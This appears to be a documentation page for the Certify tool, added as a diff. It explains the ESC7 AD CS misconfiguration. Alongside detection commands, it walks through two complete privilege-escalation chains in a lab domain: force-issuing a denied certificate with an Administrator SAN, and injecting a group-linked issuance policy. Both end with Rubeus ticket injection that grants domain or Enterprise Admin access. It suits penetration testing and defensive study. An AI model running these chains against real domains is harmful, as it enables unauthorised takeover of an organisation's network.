@@ -1,0 +1,667 @@
+---
+title: 'ESC7 - Vulnerable Certificate Authority Access Control'
+description: 'Exploit overly permissive access controls on certificate authorities using ManageCA and ManageCertificates roles'
+icon: 'shield-keyhole'
+sidebarTitle: 'ESC7'
+---
+
+ESC7 is a misconfiguration in Active Directory Certificate Services (AD CS), which stems from overly permissive access controls on certificate authorities. Specifically, if a principal has privileged roles on a certificate authority, they can potentially elevate their privileges in the domain.
+
+<Warning>
+The severity of this vulnerability depends largely on the delegated security role(s) and certificate authority configuration.
+</Warning>
+
+## Security Roles
+
+Either of the following security roles comprise an ESC7 vulnerability:
+
+<Accordion title="CA Security Roles">
+- **The `ManageCA` role (also called the `Administrator` role)**
+  - Allows the principal to manage configurations and settings on the CA.
+- **The `ManageCertificates` role (also called the `Officer` role)**
+  - Allows the principal to manage and issue certificates that are pending approval.
+</Accordion>
+
+## Detection
+
+We can search for certificate authorities with excessive role delegations using the `enum-cas --filter-vulnerable` command from Certify. For more information about the command and its parameters, please refer to the [Command Overview](./1-command-overview) page.
+
+<CodeGroup>
+```bash Command
+Certify.exe enum-cas --filter-vulnerable --hide-admins
+```
+
+```diff Output
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v2.0.0
+
+[*] Action: Find certificate authorities
+[*] Using the search base 'CN=Configuration,DC=corp,DC=local'
+[*] Classifying vulnerabilities in the context of built-in low-privileged domain groups.
+
+[*] Root CAs
+
+    ...
+
+[*] NTAuthCertificates - Certificates that enable authentication:
+
+    ...
+
+[*] Enterprise/enrollment certificate authorities:
+
+    Enterprise CA Name            : CORP-CA01-CA
+    DNS Hostname                  : ca01.corp.local
+    FullName                      : ca01.corp.local\CORP-CA01-CA
+    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
+    Cert SubjectName              : CN=CORP-CA01-CA, DC=corp, DC=local
+    Cert Thumbprint               : CFBDC6826AC074EF86BE7774F959A2FF5F322DDC
+    Cert Serial                   : 12D3E574A63DE7854A9E5A1F4CD56490
+    Cert Start Date               : 21/05/2025 12.13.47
+    Cert End Date                 : 21/05/2030 12.23.46
+    Cert Chain                    : CN=CORP-CA01-CA,DC=corp,DC=local
+    User Specifies SAN            : Disabled
+    RPC Request Encryption        : Enabled
+    Vulnerabilities
++     ESC7                        : The CA has insecure delegated security roles or permissions.
+    CA Permissions
+      Owner: BUILTIN\Administrators             S-1-5-32-544
+
+      Access Rights                                     Principal
+      Allow  Enroll                                     NT AUTHORITY\Authenticated Users   S-1-5-11
++     Allow  ManageCA, ManageCertificates               CORP\Domain Users                  S-1-5-21-976219687-1556195986-4104514715-513
+    Enrollment Agent Restrictions : None
+
+    Enabled Certificate Templates:
+        ...
+
+Certify completed in 00:00:00.6622110
+```
+</CodeGroup>
+
+<Info>
+As seen in the `CA Permissions` section, arbitrary principals can have delegated security roles on certificate authorities. The abuse scenario for this vulnerability can vary depending on the delegated security role, but we have detailed some attack scenarios for each role in the following sections.
+</Info>
+
+## ManageCA
+
+The [Certified Pre-Owned](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf) white-paper describes enabling [ESC6](./esc6-request-attribute-san-editf-attributesubjectaltname2) as one of the possible `ManageCA` attack vectors, but there are many other ways to abuse the security role.
+
+<Accordion title="ManageCA Attack Vectors">
+- **Enable [ESC6](./esc6-request-attribute-san-editf-attributesubjectaltname2) and perform the relevant attack.**
+  - This can be toggled on/off with: `Certify.exe manage-ca --ca <ca> --esc6`
+- **Enable [ESC11](./esc11-ntlm-relay-to-ad-cs-rpc-interfaces) and carry out the relevant attack.**
+  - This can be toggled on/off with: `Certify.exe manage-ca --ca <ca> --esc11`
+- **Enable [ESC16](./esc16-security-extension-disabled-on-certificate-authority) and carry out the relevant attack.**
+  - This can be toggled on/off with: `Certify.exe manage-ca --ca <ca> --esc16`
+- **Enable a disabled certificate template that is vulnerable to another escalation technique.**
+  - These can be enabled/disabled with: `Certify.exe manage-ca --ca <ca> --template <template>`
+- **Issue a certificate request that has failed due to access violation.**
+  - These can be issued with: `Certify.exe manage-ca --ca <ca> --issue-id <request id>`
+  - This attack requires the `ManageCertificates` security role.
+- **Coerce the CA server to authenticate over NTLM (and relay) via CRL Distribution Points (CDPs).**
+  - For more information, please refer to [this blogpost](https://www.tarlogic.com/blog/ad-cs-manageca-rce/).
+- **Obtain RCE on the CA server by deploying a webshell via CRL Distribution Points (CDPs).**
+  - For more information, please refer to [this blogpost](https://www.tarlogic.com/blog/ad-cs-manageca-rce/).
+</Accordion>
+
+<Warning>
+Enabling [ESC6](./esc6-request-attribute-san-editf-attributesubjectaltname2), [ESC11](./esc11-ntlm-relay-to-ad-cs-rpc-interfaces) or [ESC16](./esc16-security-extension-disabled-on-certificate-authority) may require a restart, so the easiest way to abuse the `ManageCA` role is definitely to issue a failed certificate request.
+</Warning>
+
+To do this, we need to identify a certificate template for which we do not have enrollment privileges but that has all the attributes required to be vulnerable to another escalation technique.
+
+We can search for certificate templates that have all the attributes required for the [ESC1](./esc1-misconfigured-client-authentication) abuse scenario (save for enrollment rights) using the `enum-templates --filter-client-auth --filter-supply-subject` command from Certify.
+
+<CodeGroup>
+```bash Command
+Certify.exe enum-templates --filter-client-auth --filter-supply-subject --hide-admins
+```
+
+```diff Output
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v2.0.0
+
+[*] Action: Find certificate templates
+[*] Using the search base 'CN=Configuration,DC=corp,DC=local'
+[*] Classifying vulnerabilities in the context of built-in low-privileged domain groups.
+
+[*] Listing info about the enterprise certificate authority 'CORP-CA01-CA'
+
+    ...
+
+[*] Certificate templates found using the current filter parameters:
+
+    Template Name                         : CustomUser
+    Enabled                               : True
+    Publishing CAs                        : ca01.corp.local\CORP-CA01-CA
+    Schema Version                        : 2
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
++   Certificate Name Flag                 : ENROLLEE_SUPPLIES_SUBJECT
+    Enrollment Flag                       : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
++   Manager Approval Required             : False
++   Authorized Signatures Required        : 0
++   Extended Key Usage                    : Client Authentication, Encrypting File System, Secure Email
+    Certificate Application Policies      : Client Authentication, Encrypting File System, Secure Email
+    Permissions
+      Enrollment Permissions
+      Object Control Permissions
+
+Certify completed in 00:00:01.0499119
+```
+</CodeGroup>
+
+<Info>
+If we can only identify certificate templates that are disabled (i.e. not published by any certificate authorities), we can simply enable them on an arbitrary certificate authority using the following command:
+- `Certify.exe manage-ca --ca <ca> --template <template>`
+</Info>
+
+Once we have identified a desirable certificate template, we can request a certificate based on the template from any user, and include a Subject Alternative Name (SAN) for a target user that we want to impersonate (e.g. `Administrator`).
+
+This can be done using the `request` command from Certify. The SAN can be in either of the formats `UserPrincipalName` (`--upn`), `DnsName` (`--dns`), or `Rfc822Name` (`--email`). For environments where *Strong Certificate Mapping* is enabled, the security identifier (SID) of the target user must also be supplied with the `--sid` parameter.
+
+<CodeGroup>
+```bash Command
+Certify.exe request --ca ca01.corp.local\CORP-CA01-CA --template CustomUser --upn Administrator --sid S-1-5-21-976219687-1556195986-4104514715-500
+```
+
+```diff Output
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v2.0.0
+
+[*] Action: Request a certificate
+
+[*] Current user context    : CORP\lowpriv
+[*] No subject name specified, using current context as subject.
+
+[*] Template                : CustomUser
+[*] Subject                 : CN=lowpriv, OU=Users, OU=Corp, DC=corp, DC=local
+[*] Subject Alt Name(s)     : Administrator
+[*] Sid Extension           : S-1-5-21-976219687-1556195986-4104514715-500
+
+[*] Certificate Authority   : ca01.corp.local\CORP-CA01-CA
+[!] CA Response             : The submission failed: Denied by Policy Module
+[!] Last status             : 0x80094012
+[*] Request ID              : 1337
+
+[X] Error requesting the certificate: certificate has not yet been issued! (disposition: 2)
+
+[*] Private Key (PEM)       :
+
+LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQ0KT...
+
+Certify completed in 00:00:03.6075110
+```
+</CodeGroup>
+
+<Info>
+Once the certificate request has failed, the private key used for the certificate request is printed, and we must save this for later.
+</Info>
+
+We need the `ManageCertificates` role for the next step. If we do not have the role, we can grant it with the following command:
+- `Certify.exe manage-ca --ca <ca> --officer <sid>`
+
+With both the `ManageCA` and the `ManageCertificates` roles, we can force-issue the certificate request.
+
+<CodeGroup>
+```bash Command
+Certify.exe manage-ca --ca ca01.corp.local\CORP-CA01-CA --issue-id 1337
+```
+
+```diff Output
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v2.0.0
+
+[*] Action: Manage a certificate authority
+
+[*] Attempting to issue certificate request with ID = '1337'.
+[+] The certificate request with ID = '1337' was issued.
+
+Certify completed in 00:00:00.1490875
+```
+</CodeGroup>
+
+Now that the certificate request has been issued, we can go ahead and download the certificate from the CA. This can be done using the `request-download` command from Certify. We can include the private key from our certificate request to form a fully authenticatable PKCS12 (PFX) certificate.
+
+<CodeGroup>
+```bash Command
+Certify.exe request-download --ca ca01.corp.local\CORP-CA01-CA --id 1337 --private-key LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQ0KT...
+```
+
+```diff Output
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v2.0.0
+
+[*] Action: Download a certificate
+
+[*] Certificate Authority   : ca01.corp.local\CORP-CA01-CA
+[*] Request ID              : 1337
+
+[*] Certificate (PFX)       :
+
+MIACAQMwgAYJKoZIhvcNAQcBoIAkgASCA+gwgDCABgkqh...
+
+Certify completed in 00:00:00.2616489
+```
+</CodeGroup>
+
+Once we have obtained the certificate, we can authenticate as the target principal by presenting the issued certificate. This can be done using [Rubeus](/ghostpack-docs/Rubeus-mdx/overview) with the [`asktgt`](/ghostpack-docs/Rubeus-mdx/commands/ticket-requests/asktgt) command.
+
+<CodeGroup>
+```bash Command
+Rubeus.exe asktgt /user:Administrator /certificate:MIACAQMwgAYJKoZIhvcNAQcBoIAkgASCA+gwgDCABgkqh... /ptt
+```
+
+```diff Output
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.2
+
+[*] Action: Ask TGT
+
+[*] Using PKINIT with etype rc4_hmac and subject: CN=lowpriv, OU=Users, OU=Corp, DC=corp, DC=local
+[*] Building AS-REQ (w/ PKINIT preauth) for: 'corp.local\Administrator'
+[*] Using domain controller: 10.10.10.10:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIGcjCCBm6gAwIBBaEDAgEWooIFfzCCBXthggV3MIIFc6ADAgEFoQ8bDU1FR0FLRUsuTE9DQUyiIjAg
+      ...
+[+] Ticket successfully imported!
+
+  ServiceName              :  krbtgt/corp.local
+  ServiceRealm             :  CORP.LOCAL
+  UserName                 :  Administrator
+  UserRealm                :  CORP.LOCAL
+  StartTime                :  30/06/2025 18.13.10
+  EndTime                  :  01/07/2025 04.13.10
+  RenewTill                :  07/07/2025 18.13.10
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  rc4_hmac
+  Base64(key)              :  wAFNZlLQrfb4N92MQjR1fw==
+  ASREP (key)              :  16C90B51B01389B03C92F422EFBFF805
+```
+</CodeGroup>
+
+Since the `/ptt` parameter was supplied to [Rubeus](/ghostpack-docs/Rubeus-mdx/overview) when requesting the TGT, the ticket has been injected into the Kerberos ticket list, and we should be able to authenticate as the target user and access systems that the target user has access to.
+
+<CodeGroup>
+```powershell Command
+Invoke-Command -ComputerName DC01 -ScriptBlock {whoami}
+```
+
+```bash Output
+CORP\Administrator
+```
+</CodeGroup>
+
+## ManageCertificates
+
+The [Certified Pre-Owned](https://specterops.io/wp-content/uploads/sites/3/2022/06/Certified_Pre-Owned.pdf) white-paper describes approving pending certificates as a possible `ManageCertificates` attack vector, and as such require a certificate template with the following criteria:
+
+<Accordion title="ManageCertificates Template Requirements">
+- The enterprise CA grants enrollment rights to the attacker-controlled user.
+  - Otherwise, the user would be unable to request any certificates from the CA.
+- The certificate template grants enrollment rights to the attacker-controlled user.
+  - Otherwise, the user would be unable to request certificates based on the specific template.
+- The "manager approval" feature is **enabled** for the certificate template.
+  - Otherwise, the `ManageCertificates` role would not be able to manage and issue the certificate request.
+- The "authorized signature" feature is disabled for the certificate template.
+  - Otherwise, an enrollment agent would need to sign the certificate request on behalf of the requester.
+
+Additionally, in order to perform privilege escalation, the certificate template must match the criteria of another vulnerability:
+- The certificate template defines a client authentication EKU and allows the requester to specify subject details ([ESC1](./esc1-misconfigured-client-authentication)).
+- The certificate template defines the `Any Purpose` (`2.5.29.37.0`) EKU or `Subordinate CA` (No EKUs) ([ESC2](./esc2-misconfigured-any-purpose)).
+- The certificate template defines the `Certificate Request Agent` (`1.3.6.1.4.1.311.20.2.1`) EKU ([ESC3](./esc3-misconfigured-certificate-request-agent)).
+</Accordion>
+
+We can search for certificate templates that require manager approval using the `enum-templates --filter-manager-approval` command from Certify. For more information about the command and its parameters, please refer to the [Command Overview](./1-command-overview) page.
+
+<CodeGroup>
+```bash Command
+Certify.exe enum-templates --filter-enabled --filter-client-auth --filter-manager-approval --hide-admins
+```
+
+```diff Output
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v2.0.0
+
+[*] Action: Find certificate templates
+[*] Using the search base 'CN=Configuration,DC=corp,DC=local'
+[*] Classifying vulnerabilities in the context of built-in low-privileged domain groups.
+
+[*] Listing info about the enterprise certificate authority 'CORP-CA01-CA'
+
+    ...
+
+[*] Certificate templates found using the current filter parameters:
+
+    Template Name                         : CustomUser_ManualAuth
+    Enabled                               : True
+    Publishing CAs                        : ca01.corp.local\CORP-CA01-CA
+    Schema Version                        : 2
+    Validity Period                       : 1 year
+    Renewal Period                        : 6 weeks
+    Certificate Name Flag                 : SUBJECT_ALT_REQUIRE_UPN
+    Enrollment Flag                       : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
++   Manager Approval Required             : True
++   Authorized Signatures Required        : 0
++   Extended Key Usage                    : Client Authentication, Encrypting File System, Secure Email
+    Certificate Application Policies      : Client Authentication, Encrypting File System, Secure Email
+    Permissions
+      Enrollment Permissions
++       Enrollment Rights           : CORP\Domain Users               S-1-5-21-976219687-1556195986-4104514715-513
+      Object Control Permissions
+
+Certify completed in 00:00:01.0499119
+```
+</CodeGroup>
+
+If the above certificate had the `ENROLLEE_SUPPLIES_SUBJECT` flag in the `Certificate Name Flag` attribute, it would be possible to perform an [ESC1](./esc1-misconfigured-client-authentication) attack, but with the slight variation of requiring manual manager approval using the `ManageCertificates` role. This would allow us to bypass the "manager approval has to be disabled" constraint for the [ESC1](./esc1-misconfigured-client-authentication) vulnerability.
+
+However, since this is not the case, another solution must be found. [Valdemar Carøe](https://www.linkedin.com/in/valdemar-car%C3%B8e/) and [Jonas Bülow Knudsen](https://medium.com/@jonasblowknudsen) have recently discovered a new technique inspired by the [ESC13](./esc13-authentication-mechanism-assurance-ama) misconfiguration, which requires the existence of a group-linked enterprise OID (issuance policy). The issuance policy does not have to be applied to any certificate template, it just has to exist.
+
+We can search for group-linked enterprise OIDs using the `enum-pkiobjects --show-linked-oids` command from Certify. For more information about the command and its parameters, please refer to the [Command Overview](./1-command-overview) page.
+
+<CodeGroup>
+```bash Command
+Certify.exe enum-pkiobjects --show-linked-oids
+```
+
+```diff Output
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v2.0.0
+
+[*] Action: Find PKI object controllers
+[*] Using the search base 'CN=Configuration,DC=corp,DC=local'
+
+[*] PKI Object Controllers:
+
+    ...
+
+[*] Group-linked Enterprise OIDs:
+
+Oid          :  1.3.6.1.4.1.311.21.8.5416619.5330661.8209312.10827481.9506053.121.1087175.7443011
+Display Name :  Temporary Admin Issuance
+Linked Group :  CN=TemporaryAdmins,OU=Groups,OU=Corp,DC=corp,DC=local
+
+Certify completed in 00:00:00.7806492
+```
+</CodeGroup>
+
+Once we have identified a group-linked enterprise OID, we can evaluate if the group is worth compromising. This includes checking what the group is a member of, and what access control permissions the group has across the environment.
+
+<CodeGroup>
+```powershell Command
+Get-ADGroup TemporaryAdmins -Properties MemberOf,Members
+```
+
+```bash Output
+DistinguishedName : CN=TemporaryAdmins,OU=Groups,OU=Corp,DC=corp,DC=local
+GroupCategory     : Security
+GroupScope        : Universal
+MemberOf          : {CN=Enterprise Admins,CN=Users,DC=corp,DC=local}
+Members           : {}
+Name              : TemporaryAdmins
+ObjectClass       : group
+ObjectGUID        : 96a21f6c-8b35-4654-bc7d-4b9b7a40fbdd
+SamAccountName    : TemporaryAdmins
+SID               : S-1-5-21-976219687-1556195986-4104514715-1102
+```
+</CodeGroup>
+
+<Info>
+Since the `TemporaryAdmins` group is a member of the `Enterprise Admins` group, we deem that it is worth compromising, so we request a certificate from the manager approval template using the `request` command from Certify.
+</Info>
+
+<CodeGroup>
+```bash Command
+Certify.exe request --ca ca01.corp.local\CORP-CA01-CA --template CustomUser_ManualAuth
+```
+
+```diff Output
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v2.0.0
+
+[*] Action: Request a certificate
+
+[*] Current user context    : CORP\lowpriv
+[*] No subject name specified, using current context as subject.
+
+[*] Template                : CustomUser_ManualAuth
+[*] Subject                 : CN=lowpriv, OU=Users, OU=Corp, DC=corp, DC=local
+
+[*] Certificate Authority   : ca01.corp.local\CORP-CA01-CA
+[*] CA Response             : The certificate is still pending.
+[*] Request ID              : 1337
+
+[X] Error requesting the certificate: certificate has not yet been issued! (disposition: 5)
+
+[*] Private Key (PEM)       :
+
+LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQ0KT...
+
+Certify completed in 00:00:03.5423104
+```
+</CodeGroup>
+
+<Info>
+Once the certificate request has failed, the private key used for the certificate request is printed, and we must save this for later.
+</Info>
+
+Using the `ManageCertificates` role, we can now inject the group-linked issuance policy into the pending certificate request using the `manage-ca --ca <ca> --issuance-policy <request id>:<policy oid>` command from Certify.
+
+<CodeGroup>
+```bash Command
+Certify.exe manage-ca --ca ca01.corp.local\CORP-CA01-CA --issuance-policy 1337:1.3.6.1.4.1.311.21.8.5416619.5330661.8209312.10827481.9506053.121.1087175.7443011
+```
+
+```diff Output
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v2.0.0
+
+[*] Action: Manage a certificate authority
+
+[*] Attempting to set issuance policies for targeted certificate requests.
+[+] Successfully set issuance policies for certificate request with ID = '1337'.
+
+Certify completed in 00:00:00.1322311
+```
+</CodeGroup>
+
+Once the issuance policy is injected, we can issue (manager-approve) the certificate request.
+
+<CodeGroup>
+```bash Command
+Certify.exe manage-ca --ca ca01.corp.local\CORP-CA01-CA --issue-id 1337
+```
+
+```diff Output
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v2.0.0
+
+[*] Action: Manage a certificate authority
+
+[*] Attempting to issue certificate request with ID = '1337'.
+[+] The certificate request with ID = '1337' was issued.
+
+Certify completed in 00:00:00.1393129
+```
+</CodeGroup>
+
+Now that the certificate request has been issued, we can go ahead and download the certificate from the CA. This can be done using the `request-download` command from Certify. We can include the private key from our certificate request to form a fully authenticatable PKCS12 (PFX) certificate.
+
+<CodeGroup>
+```bash Command
+Certify.exe request-download --ca ca01.corp.local\CORP-CA01-CA --id 1337 --private-key LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQ0KT...
+```
+
+```diff Output
+   _____          _   _  __
+  / ____|        | | (_)/ _|
+ | |     ___ _ __| |_ _| |_ _   _
+ | |    / _ \ '__| __| |  _| | | |
+ | |___|  __/ |  | |_| | | | |_| |
+  \_____\___|_|   \__|_|_|  \__, |
+                             __/ |
+                            |___./
+  v2.0.0
+
+[*] Action: Download a certificate
+
+[*] Certificate Authority   : ca01.corp.local\CORP-CA01-CA
+[*] Request ID              : 1337
+
+[*] Certificate (PFX)       :
+
+MIACAQMwgAYJKoZIhvcNAQcBoIAkgASCA+gwgDCABgkqh...
+
+Certify completed in 00:00:00.2616489
+```
+</CodeGroup>
+
+Once we have obtained the certificate, we can pass it to [Rubeus](/ghostpack-docs/Rubeus-mdx/overview) with the [`asktgt`](/ghostpack-docs/Rubeus-mdx/commands/ticket-requests/asktgt) command using our low-privileged user.
+
+<CodeGroup>
+```bash Command
+Rubeus.exe asktgt /user:lowpriv /certificate:MIACAQMwgAYJKoZIhvcNAQcBoIAkgASCA+gwgDCABgkqh... /ptt
+```
+
+```diff Output
+   ______        _
+  (_____ \      | |
+   _____) )_   _| |__  _____ _   _  ___
+  |  __  /| | | |  _ \| ___ | | | |/___)
+  | |  \ \| |_| | |_) ) ____| |_| |___ |
+  |_|   |_|____/|____/|_____)____/(___/
+
+  v2.0.2
+
+[*] Action: Ask TGT
+
+[*] Using PKINIT with etype rc4_hmac and subject: CN=lowpriv, OU=Users, OU=Corp, DC=corp, DC=local
+[*] Building AS-REQ (w/ PKINIT preauth) for: 'corp.local\lowpriv'
+[*] Using domain controller: 10.10.10.10:88
+[+] TGT request successful!
+[*] base64(ticket.kirbi):
+
+      doIGcjCCBm6gAwIBBaEDAgEWooIFfzCCBXthggV3MIIFc6ADAgEFoQ8bDU1FR0FLRUsuTE9DQUyiIjAg
+      ...
+[+] Ticket successfully imported!
+
+  ServiceName              :  krbtgt/corp.local
+  ServiceRealm             :  CORP.LOCAL
+  UserName                 :  lowpriv
+  UserRealm                :  CORP.LOCAL
+  StartTime                :  30/06/2025 18.13.10
+  EndTime                  :  01/07/2025 04.13.10
+  RenewTill                :  07/07/2025 18.13.10
+  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
+  KeyType                  :  rc4_hmac
+  Base64(key)              :  wAFNZlLQrfb4N92MQjR1fw==
+  ASREP (key)              :  16C90B51B01389B03C92F422EFBFF805
+```
+</CodeGroup>
+
+Since the `/ptt` parameter was supplied to [Rubeus](/ghostpack-docs/Rubeus-mdx/overview) when requesting the TGT, we should now have a ticket in our Kerberos ticket list that contains `Enterprise Admins` membership. We can verify this by attempting to execute `whoami /all` on a domain controller.
+
+<CodeGroup>
+```powershell Command
+Invoke-Command -ComputerName DC01 -ScriptBlock { whoami /all }
+```
+
+```diff Output
+USER INFORMATION
+----------------
+
+User Name    SID
+============ =============================================
+corp\lowpriv S-1-5-21-976219687-1556195986-4104514715-1100
+
+
+GROUP INFORMATION
+-----------------
+
+Group Name                Type   SID                                           Attributes
+========================= ====== ============================================= ==================================================
+...
+CORP\TemporaryAdmins      Group  S-1-5-21-976219687-1556195986-4104514715-1102 Mandatory group, Enabled by default, Enabled group
+CORP\Enterprise Admins    Group  S-1-5-21-976219687-1556195986-4104514715-519  Mandatory group, Enabled by default, Enabled group
+...
+```
+</CodeGroup>
